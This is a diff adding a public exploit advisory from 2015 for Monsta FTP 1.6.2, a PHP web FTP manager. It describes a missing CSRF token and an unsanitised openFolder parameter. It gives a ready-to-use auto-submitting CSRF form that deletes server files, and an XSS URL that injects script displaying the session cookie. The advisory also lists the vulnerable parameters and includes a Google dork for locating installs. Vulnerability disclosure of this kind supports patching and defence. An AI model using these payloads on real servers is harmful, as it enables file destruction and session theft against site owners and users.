@@ -1,0 +1,139 @@
+# Exploit Title: CSRF XSS Monsta FTP
+# Google Dork: intitle: Monsta FTP CSRF / XSS
+# Date: 2015-09-11
+# Exploit Author:   hyp3rlinx
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: www.monstaftp.com
+# Software Link:  www.monstaftp.com
+# Version: monsta_ftp_v1.6.2
+# Tested on: windows 7 SP1 XAMPP
+# Category: WebApps
+
+
+Vendor:
+================================
+www.monstaftp.com
+
+
+
+Product:
+================================
+monsta_ftp_v1.6.2
+Monsta FTP is open source PHP/Ajax cloudware browser based
+FTP file management web application.
+
+
+Vulnerability Type:
+===================
+CSRF / XSS
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+
+Vulnerability Details:
+=====================
+
+CSRF:
+-----
+No CSRF token exists when making some POST requests, allowing arbitrary
+deletion of files on the monstaftp server dirs.
+
+
+XSS:
+----
+
+Monstaftp sanitizes most $_GET requests with call to sanitizeStr() e.g -->
+echo sanitizeStr($ftp_host),
+However we find vulnerable code that is not santized on line 494 of
+ index.php --->  echo $_GET["openFolder"];
+creating an XSS entry point and will execute when victim accesses the
+Monstaftp login page before logging in.
+
+
+
+Exploit code(s):
+===============
+
+1) CSRF delete all server files
+
+<body onLoad="doit()">
+
+<script>
+function doit(){
+var e=document.getElementById('HELL')
+e.submit()
+}
+
+<form id="HELL"  action="http://localhost/monsta_ftp_v1.6.2_install/?"
+method="post">
+<input type="text" id="ftpAction"  name="ftpAction" value="delete"/>
+<input type="text" id="folderAction[]"  name="folderAction[]" value=""/>
+<input type="text" id="fileAction[]"  name="fileAction[]"
+value="~%2FSOMEFILES_TO_DELETE.php"/>
+</form>
+
+
+
+2) XSS steal PHP session ID: e.g. "PHPSESSID=7lukgqaghuqihnbj3ikcrsc715"
+
+Logout, then access the following URL before login and BOOOOOOM!.
+http://localhost/monsta_ftp_v1.6.2_install/?openFolder="/><script>alert('XSS
+by hyp3rlinx '%2bdocument.cookie)</script>
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification:  NA
+Sept 11, 2015  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+=========================================================
+Med
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+]  POST & GET
+
+
+Vulnerable Product:             [+]  monsta_ftp_v1.6.2
+
+
+Vulnerable Parameter(s):        [+] ftpAction, fileAction[], openFolder
+
+
+Affected Area(s):               [+] FTP Admin Area
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
